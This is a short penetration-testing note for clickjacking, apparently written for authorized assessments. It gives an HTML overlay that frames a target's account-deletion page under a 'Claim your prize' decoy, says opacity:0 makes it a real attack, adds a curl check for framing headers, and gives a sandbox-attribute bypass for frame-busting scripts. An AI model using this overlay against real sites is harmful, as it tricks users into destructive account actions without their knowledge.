# Clickjacking framing PoC (step 3)
# Host locally; load in a browser carrying the victim's session (test account).
# Line up the decoy with the real control, confirm the click reaches it, screenshot both layers.

## Transparent-overlay PoC
```html
<!doctype html><meta charset=utf-8>
<style>
  #decoy { position:absolute; top:0; left:0; z-index:1; }   /* what the victim thinks they click */
  iframe  { position:absolute; top:0; left:0; width:1000px; height:800px;
            opacity:0.1; z-index:2; border:0; }              /* set opacity:0 to weaponize */
</style>
<div id=decoy><button style="position:absolute;top:320px;left:120px">Claim your prize</button></div>
<iframe src="https://TARGET/account/delete"></iframe>
```
Align the decoy button over the sensitive control (adjust top/left). Keep `opacity` visible (0.1)
for the PoC so the reviewer can SEE both layers; note that `opacity:0` is the real attack.

## Defense checks (step 2)
```
curl -sI https://TARGET/<sensitive-path> | grep -iE 'x-frame-options|content-security-policy'
```
- No `X-Frame-Options` AND no CSP `frame-ancestors` → frameable.
- `frame-ancestors 'self'` or `X-Frame-Options: DENY/SAMEORIGIN` → not frameable cross-origin (unless bypass).

## Notes
- Test the SENSITIVE route specifically — defenses are often set on some pages but missed on others.
- If frame-busting JS exists, check `sandbox` iframe attribute bypass (`sandbox="allow-forms"` without
  `allow-scripts` neuters busting JS).
- Pair with `csrf` when the framed action is a cross-site state change.
